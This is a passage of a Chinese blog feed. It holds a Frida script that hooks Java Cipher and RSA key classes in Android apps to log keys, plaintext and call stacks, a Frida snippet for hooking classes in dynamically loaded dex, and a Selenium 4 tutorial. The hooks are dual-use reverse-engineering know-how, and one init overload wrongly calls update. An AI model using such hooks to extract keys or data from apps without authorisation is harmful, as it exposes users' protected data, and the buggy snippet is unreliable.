class="number">0</span>));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key:&quot;</span> + <span class="string">&quot;|Hex密钥:&quot;</span> + ByteString.of(bytes_key).hex());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher.init.overload(<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;java.security.Key&#x27;</span>, <span class="string">&#x27;java.security.AlgorithmParameters&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.init(a, b, c);</span><br><span class="line">        <span class="keyword">if</span> (N_ENCRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 加密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(N_DECRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 解密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> bytes_key = b.getEncoded();</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key:&quot;</span> + <span class="string">&quot;|str密钥:&quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(bytes_key));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key: |base64  :&quot;</span>  + Base64.encodeToString(bytes_key,<span class="number">0</span>));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key:&quot;</span> + <span class="string">&quot;|Hex密钥:&quot;</span> + ByteString.of(bytes_key).hex());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher.init.overload(<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;java.security.Key&#x27;</span>, <span class="string">&#x27;java.security.AlgorithmParameters&#x27;</span>, <span class="string">&#x27;java.security.SecureRandom&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b, c, d</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.init(a, b, c, d);</span><br><span class="line">        <span class="keyword">if</span> (N_ENCRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 加密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(N_DECRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 解密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> bytes_key = b.getEncoded();</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key:&quot;</span> + <span class="string">&quot;|str密钥:&quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(bytes_key));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key: |base64  :&quot;</span>  + Base64.encodeToString(bytes_key,<span class="number">0</span>));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key:&quot;</span> + <span class="string">&quot;|Hex密钥:&quot;</span> + ByteString.of(bytes_key).hex());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher.init.overload(<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;java.security.Key&#x27;</span>, <span class="string">&#x27;java.security.spec.AlgorithmParameterSpec&#x27;</span>, <span class="string">&#x27;java.security.SecureRandom&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b, c, d</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.update(a, b, c, d);</span><br><span class="line">        <span class="keyword">if</span> (N_ENCRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 加密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(N_DECRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 解密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> bytes_key = b.getEncoded();</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key:&quot;</span> + <span class="string">&quot;|str密钥:&quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(bytes_key));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key: |base64  :&quot;</span>  + Base64.encodeToString(bytes_key,<span class="number">0</span>));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key:&quot;</span> + <span class="string">&quot;|Hex密钥:&quot;</span> + ByteString.of(bytes_key).hex());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cipher.update.overload(<span class="string">&#x27;[B&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.update(a);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;update:&quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(a));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher.update.overload(<span class="string">&#x27;[B&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.update(a, b, c);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;update:&quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(a) + <span class="string">&quot;|&quot;</span> + b + <span class="string">&quot;|&quot;</span> + c);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher.doFinal.overload().implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.doFinal();</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;doFinal结果: |str  :&quot;</span>     + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(result));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;doFinal结果: |hex  :&quot;</span>     + ByteString.of(result).hex());</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;doFinal结果: |base64  :&quot;</span>  + Base64.encodeToString(result,<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher.doFinal.overload(<span class="string">&#x27;[B&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.doFinal(a);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;doFinal参数: |str  :&quot;</span>     + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(a));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;doFinal参数: |base64  :&quot;</span>  + Base64.encodeToString(a,<span class="number">0</span>));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;doFinal结果: |str  :&quot;</span>     + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(result));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;doFinal结果: |hex  :&quot;</span>     + ByteString.of(result).hex());</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;doFinal结果: |base64  :&quot;</span>  + Base64.encodeToString(result,<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> x509EncodedKeySpec = Java.use(<span class="string">&#x27;java.security.spec.X509EncodedKeySpec&#x27;</span>);</span><br><span class="line">    x509EncodedKeySpec.$init.overload(<span class="string">&#x27;[B&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.$init(a);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;RSA密钥:&quot;</span> + Base64.encodeToString(a,<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> rSAPublicKeySpec = Java.use(<span class="string">&#x27;java.security.spec.RSAPublicKeySpec&#x27;</span>);</span><br><span class="line">    rSAPublicKeySpec.$init.overload(<span class="string">&#x27;java.math.BigInteger&#x27;</span>, <span class="string">&#x27;java.math.BigInteger&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.$init(a, b);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;RSA密钥N:&quot;</span> + a.toString(<span class="number">16</span>));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;RSA密钥E:&quot;</span> + b.toString(<span class="number">16</span>));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>参考:<a href="https://blog.csdn.net/weixin_44032232/article/details/109643407">https://blog.csdn.net/weixin_44032232/article/details/109643407</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;我们可以通过Hook Java基础类或第三方类库中的所有加密类来盲猜app用了哪种加密类。app用的加密类只要在我们Hook的类中，就可以判断出app用了哪种加密类，通过调用堆栈定位到加密代码。&lt;/p&gt;
&lt;figure class=&quot;highlight js&quot;&gt;&lt;table</summary>
      
    
    
    
    
    <category term="逆向" scheme="https://bstark.me/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>frida hook 动态加载dex 解决hook不到类</title>
    <link href="https://bstark.me/posts/62230/"/>
    <id>https://bstark.me/posts/62230/</id>
    <published>2022-02-10T07:01:34.000Z</published>
    <updated>2022-04-01T06:32:39.706Z</updated>
    
    <content type="html"><![CDATA[<p><strong>问题:</strong></p><p>jadx中有代码,但hook不到类,打印无返回</p><p>这种情况可能是动态加载dex,类可能在另外的classloader中,需要切换到对应的classloader中在hook</p><p>frida 有一个接口 <strong>enumerateClassloaders()</strong> //枚举遍历所有的classloader类加载器</p><p><strong>hook代码:</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> MAppliction = Java.use(<span class="string">&#x27;类名&#x27;</span>) <span class="comment">//</span></span><br><span class="line">    <span class="built_in">console</span>.log(MAppliction.getInstance().getResources().getString(<span class="number">2131820921</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;ddddddddddddddddd&#x27;</span>)</span><br><span class="line">        Java.enumerateClassLoaders(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="function"><span class="keyword">function</span>(<span class="params">loader</span>)</span>&#123;</span><br><span class="line">                Java.classFactory.loader = loader;</span><br><span class="line">                <span class="keyword">var</span> TestClass;</span><br><span class="line">                <span class="keyword">try</span>&#123; <span class="comment">//处理报错,如果hook不到这个类,继续遍历下一个classloaders</span></span><br><span class="line">                    TestClass = Java.use(<span class="string">&quot;com.xbiao.utils.AESedeUtil&quot;</span>);</span><br><span class="line">                    TestClass.decrypt.implementation = <span class="function"><span class="keyword">function</span>(<span class="params">p1,p2</span>)</span>&#123;</span><br><span class="line">                        <span class="built_in">console</span>.log(<span class="string">&#x27;decrypt p1:&#x27;</span>+p1)</span><br><span class="line">                        <span class="built_in">console</span>.log(<span class="string">&#x27;decrypt p2:&#x27;</span>+p2)</span><br><span class="line">                        <span class="keyword">return</span> <span class="built_in">this</span>.decrypt(p1,p2)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">catch</span>(error)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(error.message.includes(<span class="string">&quot;ClassNotFoundException&quot;</span>))&#123;</span><br><span class="line">                        <span class="built_in">console</span>.log(<span class="string">&quot; You are trying to load encrypted class, trying next loader&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="built_in">console</span>.log(error.message);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;问题:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;jadx中有代码,但hook不到类,打印无返回&lt;/p&gt;
&lt;p&gt;这种情况可能是动态加载dex,类可能在另外的classloader中,需要切换到对应的classloader中在hook&lt;/p&gt;
&lt;p&gt;frida 有一个接</summary>
      
    
    
    
    
    <category term="逆向" scheme="https://bstark.me/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>python selenium4 库使用</title>
    <link href="https://bstark.me/posts/41283/"/>
    <id>https://bstark.me/posts/41283/</id>
    <published>2022-02-08T12:54:52.000Z</published>
    <updated>2022-04-01T06:47:52.603Z</updated>
    
    <content type="html"><![CDATA[<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置:"></a>环境配置:</h3><p><strong>chromedriver</strong></p><p>Windows下需要放到Chrome安装目录,且下载版本和chrome浏览器一致.</p><p> <a href="https://chromedriver.storage.googleapis.com/index.html">https://chromedriver.storage.googleapis.com/index.html</a></p><p><strong>Firefox</strong></p><p><a href="https://github.com/mozilla/geckodriver/releases/">https://github.com/mozilla/geckodriver/releases/</a></p><p><strong>IE</strong></p><p><a href="http://selenium-release.storage.googleapis.com/index.html">http://selenium-release.storage.googleapis.com/index.html</a></p><p><strong>安装 selenium</strong><br><code>pip3 install selenium</code></p><h3 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h3><p><strong>导入库</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver<span class="comment">#导入相关库</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br></pre></td></tr></table></figure><p><strong>启动一个浏览器</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">driver = webdriver.Chrome(<span class="string">&quot;C:\Program Files\Google\Chrome\Application\chromedriver.exe&quot;</span>)<span class="comment">#指定chromedriver,不然会报错</span></span><br><span class="line">driver.get(<span class="string">&#x27;https://www.baidu.com/&#x27;</span>)<span class="comment">#打开一个网站</span></span><br></pre></td></tr></table></figure><h3 id="元素定位"><a href="#元素定位" class="headerlink" title="元素定位"></a>元素定位</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;kw&quot;</span> <span class="attr">name</span>=<span class="string">&quot;wd&quot;</span> <span class="attr">class</span>=<span class="string">&quot;s_ipt&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;255&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;off&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">id</span>=<span class="string">&quot;su&quot;</span> <span class="attr">value</span>=<span class="string">&quot;百度一下&quot;</span> <span class="attr">class</span>=<span class="string">&quot;bg s_btn&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">class</span>=<span class="string">&quot;lnk-movie&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://movie.douban.com&quot;</span>&gt;</span>豆瓣电影<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>选择器</th><th>语法</th></tr></thead><tbody><tr><td>id</td><td>driver.find_element(By.ID,’id’)</td></tr><tr><td>name</td><td>driver.find_element(By.NAME,’name’)</td></tr><tr><td>class name</td><td>driver.find_element(By.CLASS_NAME,’name’)</td></tr><tr><td>tag name</td><td>driver.find_element(By.TAG_NAME,’name’)</td></tr><tr><td>link text</td><td>driver.find_element(By.LINK_TEXT,’name’)</td></tr><tr><td>partial link text</td><td>driver.find_element(By.PARTIAL_LINK_TEXT,’name’)</td></tr><tr><td>css selector</td><td>driver.find_element(By.CSS_SELECTOR,’name’)</td></tr><tr><td>xpath</td><td>driver.find_element(By.XPATH,’name’)</td></tr></tbody></table><p><strong>ID</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;s_ipt&quot;</span> <span class="attr">name</span>=<span class="string">&quot;wd&quot;</span> <span class="attr">id</span>=<span class="string">&quot;kw&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;100&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;off&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">element = driver.find_element(By.ID, <span class="string">&#x27;kw&#x27;</span>)   <span class="comment"># 通过ID定位搜索框</span></span><br><span class="line">element.send_keys(<span class="string">&#x27;selenium&#x27;</span>)    <span class="comment"># 输入selenium 验证定位是否成功</span></span><br></pre></td></tr></table></figure><p><strong>name</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;s_ipt&quot;</span> <span class="attr">name</span>=<span class="string">&quot;wd&quot;</span> <span class="attr">id</span>=<span class="string">&quot;kw&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;100&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;off&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">element = driver.find_element(By.NAME, <span class="string">&#x27;wd&#x27;</span>)   <span class="comment"># 通过name定位搜索框</span></span><br></pre></td></tr></table></figure><p><strong>class</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;s_ipt&quot;</span> <span class="attr">name</span>=<span class="string">&quot;wd&quot;</span> <span class="attr">id</span>=<span class="string">&quot;kw&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;100&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;off&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn_wr s_btn_wr bg&quot;</span> <span class="attr">name</span>=<span class="string">&quot;wd&quot;</span> <span class="attr">id</span>=<span class="string">&quot;kw&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;100&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;off&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">element = driver.find_element(By.CLASS_NAME, <span class="string">&#x27;s_ipt&#x27;</span>)   <span class="comment"># 获取百度首页搜索框</span></span><br><span class="line"></span><br><span class="line">element = driver.find_element(By.CLASS_NAME, <span class="string">&#x27;btn_wr s_btn_wr bg&#x27;</span>) <span class="comment">#定位不到,只能选择其中一个</span></span><br></pre></td></tr></table></figure><p><strong>tag name</strong></p><p>tag name，即元素标签名称，如input、p、a、button、span等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">element = driver.find_element(By.TAG_NAME, <span class="string">&#x27;input&#x27;</span>)  <span class="comment"># 查找标签名称是input的元素</span></span><br></pre></td></tr></table></figure><p><strong>link text</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;www.xxx.com“&gt;xxx //超文本连接定位</span></span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">element = driver.find_element(By.LINK_TEXT, <span class="string">&#x27;贴吧&#x27;</span>)   <span class="comment"># 定位贴吧</span></span><br></pre></td></tr></table></figure><p><strong>partial link text</strong></p><p>此定位方式于link text一样，都只能作用于链接元素，也使用可见文本进行匹配，不同之处在于，link text表示可见文本必须于指定的文本完全一致，才能匹配成功，而partial link text只要可见文本中包含指定的文本，则匹配成功，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">element = driver.find_element(By.PARTIAL_LINK_TEXT, <span class="string">&#x27;贴&#x27;</span>)   <span class="comment"># 定位贴吧</span></span><br></pre></td></tr></table></figure><p><strong>css selector</strong>  </p><p>语法较为复杂,舍弃</p><p><strong>xpath</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">element = driver.find_element(By.XPATH, <span class="string">&quot;//*/input[@id=&#x27;kw&#x27;]&quot;</span>)</span><br><span class="line">element = driver.find_element(By.XPATH, <span class="string">&quot;//*/input[@name=&#x27;wd&#x27;]&quot;</span>)</span><br><span class="line">element = driver.find_element(By.XPATH, <span class="string">&quot;//*/input[@class=&#x27;s_ipt&#x27;]&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>定位iframe</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span> <span class="attr">id</span>=<span class="string">&quot;iframeResult&quot;</span> <span class="attr">style</span>=<span class="string">&quot;height: 219.64px;&quot;</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">element.switch_to.frame(<span class="string">&#x27;iframeResult&#x27;</span>)  <span class="comment">#选择iframe</span></span><br></pre></td></tr></table></figure><h3 id="交互操作"><a href="#交互操作" class="headerlink" title="交互操作"></a>交互操作</h3><p><strong>操作对象</strong></p><ul><li>click——点击对象</li><li>send_keys——在对象上模拟按键输入</li><li>clear——清除对象的内容，如果可以的话</li><li>submit——提交对象的内容，表单提交</li><li>text——用于获取元素的文本信息</li></ul><p><strong>键盘事件</strong></p><p>要想调用键盘按键操作需要引入 keys 包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys  通过 send_keys()调用按键：</span><br><span class="line">send_keys(Keys.TAB) <span class="comment"># TAB</span></span><br><span class="line">send_keys(Keys.ENTER) <span class="comment"># 回车</span></span><br><span class="line">driver.find_element(By.<span class="built_in">id</span>,<span class="string">&quot;kw&quot;</span>).send_keys(Keys.CONTROL,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#ctrl+A 全选</span></span><br><span class="line">driver.find_element(By.<span class="built_in">id</span>,<span class="string">&quot;kw&quot;</span>).send_keys(Keys.CONTROL,<span class="string">&#x27;x&#x27;</span>) <span class="comment">#ctrl+X 剪切</span></span><br></pre></td></tr></table></figure><p><strong>鼠标事件</strong></p><p>需要引入ActionChains类,鼠标事件一般包括鼠标右键、双击、拖动、移动鼠标到某个元素上等等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.common.action_chains <span class="keyword">import</span> ActionChains</span><br><span class="line">perform()  <span class="comment">#执行所有ActionChains 中存储的行为；</span></span><br><span class="line">context_click()  <span class="comment">#右击；</span></span><br><span class="line">double_click()   <span class="comment">#双击；</span></span><br><span class="line">drag_and_drop()  <span class="comment">#拖动；</span></span><br><span class="line">move_to_element()   <span class="comment">#鼠标悬停。</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver<span class="comment">#导入相关库</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome(<span class="string">&quot;C:\Program Files\Google\Chrome\Application\chromedriver.exe&quot;</span>)<span class="comment">#指定chromedriver,不然会报错</span></span><br><span class="line">driver.get(<span class="string">&#x27;https://www.baidu.com/&#x27;</span>)<span 